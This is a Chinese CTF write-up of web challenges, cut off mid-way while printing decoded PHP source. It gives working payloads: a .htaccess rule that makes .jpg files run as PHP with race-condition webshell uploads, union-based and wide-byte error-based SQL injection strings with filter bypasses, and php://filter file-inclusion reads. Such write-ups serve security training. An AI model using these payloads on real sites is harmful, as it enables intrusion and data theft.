+<p><img src="https://img-blog.csdnimg.cn/20200109133838937.png" alt="判断服务器类型"></p>
+<p>所以创建.htaccess文件，添加如下代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
+
+<p>使Apache用<font color=red>php</font>来解析<font color=red>.jpg</font>文件，上传</p>
+<p><img src="https://img-blog.csdnimg.cn/20200109115813778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="上传.htaccess"></p>
+<p>传好之后去打开刚刚上传的<font color=red>.jpg</font>的一句话木马，发现404，然后去访问.htaccess发现也404了。<br>重新上传，访问，不断刷新，发现文件在两三秒后被删除了。<br>测试发现只要SESSION不变，上传之后的路径就是一样的，于是可以推测是<font color=red>条件竞争</font>：只要我们不断在它被删除之前重新上传它，它就会一直存在。<br>将上传的post包Send to Intruder不断重放，然后连接就可以了。</p>
+<p><img src="https://img-blog.csdnimg.cn/20200109115851504.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="Intruder重放包"></p>
+<p>再使用中国蚁剑连接获得网站管理权</p>
+<p><img src="https://img-blog.csdnimg.cn/20200109115922214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="中国蚁剑"></p>
+<p>在根目录找到flag</p>
+<p><img src="https://img-blog.csdnimg.cn/20200109120024419.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="找到flag"></p>
+<h3 id="知识扩充：-4"><a href="#知识扩充：-4" class="headerlink" title="知识扩充："></a>知识扩充：</h3><ul>
+<li>添加gif89a的头</li>
+<li>script绕过php检测</li>
+<li>php2，php3、php4、php5、phtml、phtm代替php后缀</li>
+<li>传.htaccess</li>
+<li>截断上传</li>
+</ul>
+<h2 id="BabySqli-v1-0"><a href="#BabySqli-v1-0" class="headerlink" title="BabySqli v1.0"></a>BabySqli v1.0</h2><h3 id="题目描述：-9"><a href="#题目描述：-9" class="headerlink" title="题目描述："></a>题目描述：</h3><p>刚学完sqli，我才知道万能口令这么危险，还好我进行了防护，还用md5哈希了密码！</p>
+<h3 id="解题思路：-9"><a href="#解题思路：-9" class="headerlink" title="解题思路："></a>解题思路：</h3><p>题目告诉我们是用md5哈希了密码，fuzz时候随便输入个账号密码登录，提示wrong pass，看源代码</p>
+<p><img src="https://img-blog.csdnimg.cn/20200109161030277.png" alt="fuzz测试"></p>
+<blockquote>
+<p>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</p>
+</blockquote>
+<p>base32解码得到c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw&#x3D;&#x3D;</p>
+<p>base64解密得到select * from user where username &#x3D; ‘$name’</p>
+<p>于是发现name参数可以注入</p>
+<p>因为题目没放源码，就自己盲猜一下源码大致是这样的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">$name = $_POST[&#x27;name&#x27;];</span><br><span class="line">$passwd = md5($_POST[&#x27;pw&#x27;]);</span><br><span class="line">$sql = &quot;select * from user where username = &#x27;$name&#x27;&quot;;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line">if(!strcasecmp($passwd, $query[passwd]))</span><br><span class="line">&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    echo(&quot;Wrong Pass&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将查询出来的passwd和输入的密码的md5值比较，相等则登录不相等则wrong pass.</p>
+<p>我们需要在user表里查询我们输入的字段名并进行判断,而我们什么都不知道,这时候就需要骚操作了<br>在sql数据库里,当联合查询一个不存在的数据时会虚拟一个根据使用表排序的数据,根据这个特性来进行绕过</p>
+<p>而由于name参数可注，我们可以构造sql语句使其查询为假，然后联合查询出一个比如e10adc3949ba59abbe56e057f20f883e(123456的md5)，然后密码输入123456，就会查询成功。</p>
+<p>问题在于，既然 123456 的md5肯定不在数据库里，怎么select出来？这很简单</p>
+<p><img src="https://img-blog.csdnimg.cn/20191225175932635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="联合查询"></p>
+<p>其实只要保证联合查询的结构一样，就可以直接select后面输入你想要的查询的返回值，如上图所示。</p>
+<p>如果用户不是admin 会提示wrong user，本题先判断user是admin然后再判断密码</p>
+<p><img src="https://img-blog.csdnimg.cn/20191225180422584.png" alt="用户名须为admin"></p>
+<p>过滤了and可以大小写绕过，过滤了等号可以换成不等号 注出密码<br>cdc9c819c7f8be2628d4180669009d28<br>发现解不开，分析后发现，是考md5绕过。</p>
+<p>由于题目的查询语句是：<br>select * from user where username &#x3D; ‘$name’<br>联合查询需要表结构完全一样，所以前面注出3个column也还是有用的。当然也有其他方法，比如如果不是3个column会提示<br>Error: The used SELECT statements have a different number of columns</p>
+<p><img src="https://img-blog.csdnimg.cn/20191225180808651.png" alt="注入应该为3个Column"></p>
+<p>测试后发现，select ‘A’,’B’,’C’ 其中A是id,  B是用户名必须为admin, C是密码的md5，于是，先构造查询为假(And 1&gt;2绕过and和&#x3D;过滤)，然后联合查询返回自定的md5，在输入对应的密码，最终exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=admin&#x27; And 1&gt;2 union select &#x27;1&#x27;,&#x27;admin&#x27;,&#x27;e10adc3949ba59abbe56e057f20f883e&amp;pw=123456</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20200109163707222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="得到flag"></p>
+<h2 id="BabySqli-v2-0"><a href="#BabySqli-v2-0" class="headerlink" title="BabySqli v2.0"></a>BabySqli v2.0</h2><h3 id="题目描述：-10"><a href="#题目描述：-10" class="headerlink" title="题目描述："></a>题目描述：</h3><h3 id="解题思路：-10"><a href="#解题思路：-10" class="headerlink" title="解题思路："></a>解题思路：</h3><p>打开题目，可以看到 “我对网站进行了加固，还<font color=red>支持了中文账号</font>，这下你们没辙了吧？” 进入，发现只要是输入<font color=red>admin</font>，无论任何密码都登录成功，还是get方式，然而并没什么用</p>
+<p><img src="https://img-blog.csdnimg.cn/20200109165147977.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="发现"></p>
+<p>（刚开始做的时候 图片右下角有个放大镜，我天真的以为是图片misc和web结合了，分析了半天图片23333） fuzz无果，手工fuzz，输入<font color=red>admin%df’</font>后出现了报错，明显的宽字节注入</p>
+<p><img src="https://img-blog.csdnimg.cn/20200109171732997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="宽字节注入"></p>
+<p>知道了这一点，就很多方法了，我用了<font color=red>updatexml()</font>报错注入和<font color=red>floor()</font>报错注入两种方法，还有别的大佬用布尔盲注等等<br>另外：fuzz发现<font color=red>union select where</font>之类的这些关键字会被过滤删除，不过这都是老套路，双写绕过即可，比如<font color=red>select</font>可以使用<font color=red>seSELECTlect</font>绕过</p>
+<p><b>解法1:floor()报错注入</b></p>
+<p>推荐一篇文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39101049/article/details/88839514">https://blog.csdn.net/qq_39101049&#x2F;article&#x2F;details&#x2F;88839514</a></p>
+<p>就直接照着文章往里面套就行了。直接给最终的出flag的exp吧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/search.php?name=%df&#x27;and(seselectlect 1 from(sselectelect count(*),concat((sselectelect (SESELECTLECT  concat(327a6c4304ad5938eaf0efb6cc3e53dc) FROM f14g limit 22,1) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&amp;pw=y1ng</span><br></pre></td></tr></table></figure>
+
+<p>然后把注出来的base64解码即可。</p>
+<p><b>解法2：updatexml报错注入</b></p>
+<p>我最开始是用的updatexml报错，但是这个方法有几个坑。后来发现其他的方法似乎都比这个简单，醉了~ 简单介绍一下<font color=red>updatexml()</font>报错注入的原理</p>
+<blockquote>
+<p>updatexml (XML_document, XPath_string, new_value);</p>
+</blockquote>
+<p><font color=red>updatexml()</font>函数第第二个参数为<font color=red>XPath_string</font>，但是我们将<font color=red>concat()</font>作为第二个参数传给<font color=red>updatexml()</font>函数，<font color=red>concat()</font>返回类型为字符串所以不满足<font color=red>XPath_string</font>格式出现<font color=red>XPath syntax error</font>，进而爆出数据库信息。</p>
+<p>&lt;1&gt;查数据库名</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://172.21.4.12:10012/search.php?name=admin%EF%BF%BD%27">http://172.21.4.12:10012/search.php?name=admin%df%27</a> and updatexml(1,concat(1,database()),1) –+&amp;pw&#x3D;y1ng</p>
+</blockquote>
+<p>得到</p>
+<blockquote>
+<p>Error: XPATH syntax error: ‘web_sqli’</p>
+</blockquote>
+<p>其实一般的exp都是<font color=red>concat()</font>拼接上一个字符’<font color=red><del></font>‘，编码为<font color=red>0x7e</font>，本题fuzz发现hex被过滤了，所以<font color=red>concat()</font>里直接拼个1算了，本题中并不影响。加’<font color=red></del></font>‘是因为<font color=red>updatexml()</font>会报错字母和特殊字符之后的内容，所以手工补上一个特殊字符’<font color=red>~</font>‘</p>
+<p><img src="https://img-blog.csdnimg.cn/2020010917183624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="hex编码"></p>
+<p>&lt;2&gt;查表名</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://172.21.4.12:10012/search.php?name=admin%EF%BF%BD%27">http://172.21.4.12:10012/search.php?name=admin%df%27</a> and updatexml(1,concat(1, (seSELECTlect group_concat(table_name) from information_schema.tables whWHEREere table_schema&#x3D;database() limit 0,1)),1) –+&amp;pw&#x3D;y1ng</p>
+</blockquote>
+<p>得到</p>
+<blockquote>
+<p>Error: XPATH syntax error: ‘f14g,user’</p>
+</blockquote>
+<p>可以判定出来flag在f14g表里，而现在登录使用的是user表</p>
+<p>&lt;3&gt;查列名</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://172.21.4.12:10012/search.php?name=admin%EF%BF%BD%27">http://172.21.4.12:10012/search.php?name=admin%df%27</a> and updatexml(1,concat(1, (seSELECTlect group_concat(column_name) from information_schema.columns  wherWHEREe TABLE_SCHEMA&#x3D;database() and TABLE_NAME&#x3D;f14g)),1) –+&amp;pw&#x3D;y1ng</p>
+</blockquote>
+<p>得到</p>
+<blockquote>
+<p>Error: Unknown column ‘f14g’ in ‘where clause’</p>
+</blockquote>
+<p>不加引号的f14g无法查询成功，可以使用char编码绕过（我太菜了）</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://172.21.4.12:10012/search.php?name=admin%EF%BF%BD%27%20and%20updatexml(1,concat(1,%20(seSELECTlect%20group_concat(column_name)%20from%20information_schema.columns%20wherWHEREe%20TABLE_NAME=char(102,49,52,103))),1)%20--+&amp;pw=y1ng">http://172.21.4.12:10012/search.php?name=admin%df%27%20and%20updatexml(1,concat(1,%20(seSELECTlect%20group_concat(column_name)%20from%20information_schema.columns%20wherWHEREe%20TABLE_NAME=char(102,49,52,103))),1)%20--+&amp;pw=y1ng</a></p>
+</blockquote>
+<p>返回</p>
+<blockquote>
+<p>Error: XPATH syntax error: ‘b80bb7740288fda1f201890375a60c8f’</p>
+</blockquote>
+<p>其实我当时发现不加引号的f14g无法查询，放宽了查询条件，直接<font color=red>where table_schema&#x3D;database()</font>查所有字段，输出的结果和上面一样。<br>后面的事情就有点搞笑<br>现在已经查到f14g这个表里有一个名为<font color=red>b80bb7740288fda1f201890375a60c8f</font>的列，md5解密后为id，然后发现这个里面的字段真就是id号一堆数字。<br>我当时没想到怎么查另一个列（后来群里有师傅看不下去我这个菜鸡然后告诉了我），就盲猜有一个专门存flag的列，他也是md5加密的，<font color=red>‘flag’</font>的md5为<font color=red>327a6c4304ad5938eaf0efb6cc3e53dc</font>，然后发现还真是，盲猜列名猜对了2333333<br>无敌脑洞，盲猜列名，哈哈哈哈哈哈哈</p>
+<p>&lt;4&gt;查字段</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://172.21.4.12:10012/search.php?name=admin%EF%BF%BD%27">http://172.21.4.12:10012/search.php?name=admin%df%27</a> and updatexml(1,concat(1, (seleSELECTct concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 0,1),1),1) –+ &amp;pw&#x3D;y1ng</p>
+</blockquote>
+<p>得到base64</p>
+<blockquote>
+<p>Error: XPATH syntax error: ‘VGhlIGZpcnN0IG1hbiBuYW1lIHdhcyBr’</p>
+</blockquote>
+<p>解密之</p>
+<blockquote>
+<p>The first man name was k</p>
+</blockquote>
+<p>然后通过修改limit继续查，发现每条都是个base64，解密出来是抖肩舞的歌词！！！ 就在注入半天+盲猜半天+又注入了半天结果发现是没用的歌词然后心态爆炸的时候，在歌词的后面查到了flag….</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://172.21.4.12:10012/search.php?name=admin%EF%BF%BD%27">http://172.21.4.12:10012/search.php?name=admin%df%27</a> and updatexml(1,concat(1, (seleSELECTct concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1),1),1) –+ &amp;pw&#x3D;y1ng</p>
+</blockquote>
+<p>得到：</p>
+<blockquote>
+<p>Error: XPATH syntax error: ‘R1hZe2cwT2Rfam9iMWltX3NvX3ZlZ2V0’</p>
+</blockquote>
+<p>解密得到：<font color=red>GXY{g0Od_job1im_so_veget</font><br>不全，盲猜<font color=red>GXY{g0Od_job1im_so_vegetable}</font>，上面盲猜列，现在又盲猜flag，都猜对了23333无敌脑洞</p>
+<p>&lt;5&gt;为什么查到的东西不全？</p>
+<p>这是因为<font color=red>updatexml()</font>限制长度为32位，超过32位的被丢弃了，所以上面无论是歌词还是flag，base64都经常缺个尾巴。 不过这也不是问题！<font color=red>substr()</font>可以指定从字符串的某个位置开始，返回自定义长度：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://172.21.4.12:10012/search.php?name=admin%EF%BF%BD%27">http://172.21.4.12:10012/search.php?name=admin%df%27</a> and updatexml(1,concat(1, substr((seleSELECTct concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1),10,32)),1) –+ &amp;pw&#x3D;y1ng</p>
+</blockquote>
+<p>得到</p>
+<blockquote>
+<p>Error: XPATH syntax error: ‘Rfam9iMWltX3NvX3ZlZ2V0YWJsZX0&#x3D;’</p>
+</blockquote>
+<p>把上面缺尾巴的和现在的base64拼接起来：</p>
+<blockquote>
+<p>R1hZe2cwT2Rfam9iMWltX3NvX3ZlZ2V0 加 Rfam9iMWltX3NvX3ZlZ2V0YWJsZX0&#x3D;</p>
+</blockquote>
+<p>去重后得到</p>
+<blockquote>
+<p>R1hZe2cwT2Rfam9iMWltX3NvX3ZlZ2V0YWJsZX0&#x3D;</p>
+</blockquote>
+<p>解密：<font color=red>GXY{g0Od_job1im_so_vegetable}</font></p>
+<p>&lt;6&gt;怎么通过updatexml查f14g表里的另一个字段</p>
+<p>不管是<font color=red>group_concat()</font>也好还是<font color=red>concat_ws()</font>也好还是<font color=red>concat()</font>，都把结果连成了一个字符串输出。碰巧<font color=red>updatexml()</font>限制长度为32位、而一个md5列名刚好也32位，就制造出了只能查出id的md5的那个列的假象。 得到flag时候都能想到用<font color=red>substr()</font>取后面，现在怎么没想到呢hhh（我太菜了）   挺好的一个题，还特意过滤hex，imagin师傅(出题人)真细！</p>
+<h3 id="知识扩充：-5"><a href="#知识扩充：-5" class="headerlink" title="知识扩充："></a>知识扩充：</h3><ul>
+<li>宽字节注入</li>
+<li>过滤0x</li>
+<li>union select where置空</li>
+</ul>
+<h2 id="BabySqli-v3-0"><a href="#BabySqli-v3-0" class="headerlink" title="BabySqli v3.0"></a>BabySqli v3.0</h2><h3 id="题目描述：-11"><a href="#题目描述：-11" class="headerlink" title="题目描述："></a>题目描述：</h3><h3 id="解题思路：-11"><a href="#解题思路：-11" class="headerlink" title="解题思路："></a>解题思路：</h3><p>这个题目因为出题人多打了个空格，出现了一个非常easy的非预期，我是用非预期做的，非常非常非常的搞笑。 这题目本意是考<font color=red>phar反序列化</font>，关于phar反序列化可以参考以下文章：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2715#toc-6">https://xz.aliyun.com/t/2715#toc-6</a></li>
+<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></li>
+</ul>
+<p>这个题目挺坑的，根本没有数据库然后题目叫Babysqliv3.0，搞选手心态。 下面先介绍正常解法再介绍非预期。</p>
+<p><b>登录</b></p>
+<p>这个题目登录窗口简直和前两个sqli一毛一样，但是fuzz后无果，考虑爆破。 前两个题的username都是<font color=red>admin</font>所以这次也先爆破密码</p>
+<p><img src="https://img-blog.csdnimg.cn/20200109180542277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="添加爆破选项"></p>
+<p>设置好payload后开始爆破，两秒后爆破出密码为password</p>
+<p><img src="https://img-blog.csdnimg.cn/2020010918061374.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="爆出密码"></p>
+<p><b>LFI读源码</b></p>
+<p>登录成功后，自动跳转至</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://172.21.4.12:10041/home.php?file=upload">http://172.21.4.12:10041/home.php?file=upload</a></p>
+</blockquote>
+<p>发现是个上传页面，上面明确写着，<font color=red>当前引用的是 upload.php </font><br>而url又有<font color=red>file&#x3D;upload</font>，于是访问<font color=red>upload.php</font>，发现这两个页面一样，说明是文件包含</p>
+<p><img src="https://img-blog.csdnimg.cn/20200109180833448.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="文件包含"></p>
+<p>简单扫一下目录发现存在flag.php，尝试包含发现flag被ban了</p>
+<p><img src="https://img-blog.csdnimg.cn/20200109180932755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="flag被ban"></p>
+<p>而包含其他文件，则会在后面拼接上<font color=red>.fxxkyou!</font>，经测试%00截断等方法对此都无效</p>
+<p><img src="https://img-blog.csdnimg.cn/202001091810219.png" alt="被fuck了"></p>
+<p>经过不断fuzz后发现： 若包含的文件以<font color=red>home</font>或<font color=red>upload</font>结尾，则在后面拼接上<font color=red>.php</font>后包含；其他都被拼接上.fxxkyou! 但是伪协议没有被ban，因此我们可以使用伪协议读源码：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://172.21.4.12:10041/home.php?file=php://filter/read=convert.base64-encode/resource=upload">http://172.21.4.12:10041/home.php?file=php://filter/read=convert.base64-encode/resource=upload</a></p>
+</blockquote>
+<p>得到当前引用的是 php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;upload.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiIC8+IA0KDQo8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj4NCgnkuIrkvKDmlofku7YNCgk8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSIgLz4NCgk8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSLkuIrkvKAiIC8+DQo8L2Zvcm0+DQoNCjw/cGhwDQplcnJvcl9yZXBvcnRpbmcoMCk7DQpjbGFzcyBVcGxvYWRlcnsNCglwdWJsaWMgJEZpbGVuYW1lOw0KCXB1YmxpYyAkY21kOw0KCXB1YmxpYyAkdG9rZW47DQoJDQoNCglmdW5jdGlvbiBfX2NvbnN0cnVjdCgpew0KCQkkc2FuZGJveCA9IGdldGN3ZCgpLiIvdXBsb2Fkcy8iLm1kNSgkX1NFU1NJT05bJ3VzZXInXSkuIi8iOw0KCQkkZXh0ID0gIi50eHQiOw0KCQlAbWtkaXIoJHNhbmRib3gsIDA3NzcsIHRydWUpOw0KCQlpZihpc3NldCgkX0dFVFsnbmFtZSddKSBhbmQgIXByZWdfbWF0Y2goIi9kYXRhOlwvXC8gfCBmaWx0ZXI6XC9cLyB8IHBocDpcL1wvIHwgXC4vaSIsICRfR0VUWyduYW1lJ10pKXsNCgkJCSR0aGlzLT5GaWxlbmFtZSA9ICRfR0VUWyduYW1lJ107DQoJCX0NCgkJZWxzZXsNCgkJCSR0aGlzLT5GaWxlbmFtZSA9ICRzYW5kYm94LiRfU0VTU0lPTlsndXNlciddLiRleHQ7DQoJCX0NCg0KCQkkdGhpcy0+Y21kID0gImVjaG8gJzxicj48YnI+TWFzdGVyLCBJIHdhbnQgdG8gc3R1ZHkgcml6aGFuITxicj48YnI+JzsiOw0KCQkkdGhpcy0+dG9rZW4gPSAkX1NFU1NJT05bJ3VzZXInXTsNCgl9DQoNCglmdW5jdGlvbiB1cGxvYWQoJGZpbGUpew0KCQlnbG9iYWwgJHNhbmRib3g7DQoJCWdsb2JhbCAkZXh0Ow0KDQoJCWlmKHByZWdfbWF0Y2goIlteYS16MC05XSIsICR0aGlzLT5GaWxlbmFtZSkpew0KCQkJJHRoaXMtPmNtZCA9ICJkaWUoJ2lsbGVnYWwgZmlsZW5hbWUhJyk7IjsNCgkJfQ0KCQllbHNlew0KCQkJaWYoJGZpbGVbJ3NpemUnXSA+IDEwMjQpew0KCQkJCSR0aGlzLT5jbWQgPSAiZGllKCd5b3UgYXJlIHRvbyBiaWcgKOKAsuKWvWDjgIMpJyk7IjsNCgkJCX0NCgkJCWVsc2V7DQoJCQkJJHRoaXMtPmNtZCA9ICJtb3ZlX3VwbG9hZGVkX2ZpbGUoJyIuJGZpbGVbJ3RtcF9uYW1lJ10uIicsICciIC4gJHRoaXMtPkZpbGVuYW1lIC4gIicpOyI7DQoJCQl9DQoJCX0NCgl9DQoNCglmdW5jdGlvbiBfX3RvU3RyaW5nKCl7DQoJCWdsb2JhbCAkc2FuZGJveDsNCgkJZ2xvYmFsICRleHQ7DQoJCS8vIHJldHVybiAkc2FuZGJveC4kdGhpcy0+RmlsZW5hbWUuJGV4dDsNCgkJcmV0dXJuICR0aGlzLT5GaWxlbmFtZTsNCgl9DQoNCglmdW5jdGlvbiBfX2Rlc3RydWN0KCl7DQoJCWlmKCR0aGlzLT50b2tlbiAhPSAkX1NFU1NJT05bJ3VzZXInXSl7DQoJCQkkdGhpcy0+Y21kID0gImRpZSgnY2hlY2sgdG9rZW4gZmFsaWVkIScpOyI7DQoJCX0NCgkJZXZhbCgkdGhpcy0+Y21kKTsNCgl9DQp9DQoNCmlmKGlzc2V0KCRfRklMRVNbJ2ZpbGUnXSkpIHsNCgkkdXBsb2FkZXIgPSBuZXcgVXBsb2FkZXIoKTsNCgkkdXBsb2FkZXItPnVwbG9hZCgkX0ZJTEVTWyJmaWxlIl0pOw0KCWlmKEBmaWxlX2dldF9jb250ZW50cygkdXBsb2FkZXIpKXsNCgkJZWNobyAi5LiL6Z2i5piv5L2g5LiK5Lyg55qE5paH5Lu277yaPGJyPiIuJHVwbG9hZGVyLiI8YnI+IjsNCgkJZWNobyBmaWxlX2dldF9jb250ZW50cygkdXBsb2FkZXIpOw0KCX0NCn0NCg0KPz4NCg==</span><br></pre></td></tr></table></figure>
+
+<p>base64解码后得到upload.php的源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </span><br><span class="line"></span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    ä¸ä¼ æä»¶</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;ä¸ä¼ &quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Uploader&#123;</span><br><span class="line">    public $Filename;</span><br><span class="line">    public $cmd;</span><br><span class="line">    public $token;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $sandbox = getcwd().&quot;/uploads/&quot;.md5($_SESSION[&#x27;user&#x27;]).&quot;/&quot;;</span><br><span class="line">        $ext = &quot;.txt&quot;;</span><br><span class="line">        @mkdir($sandbox, 0777, true);</span><br><span class="line">        if(isset($_GET[&#x27;name&#x27;]) and !preg_match(&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;, $_GET[&#x27;name&#x27;]))&#123;</span><br><span class="line">            $this-&gt;Filename = $_GET[&#x27;name&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $this-&gt;Filename = $sandbox.$_SESSION[&#x27;user&#x27;].$ext;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $this-&gt;cmd = &quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;;</span><br><span class="line">        $this-&gt;token = $_SESSION[&#x27;user&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function 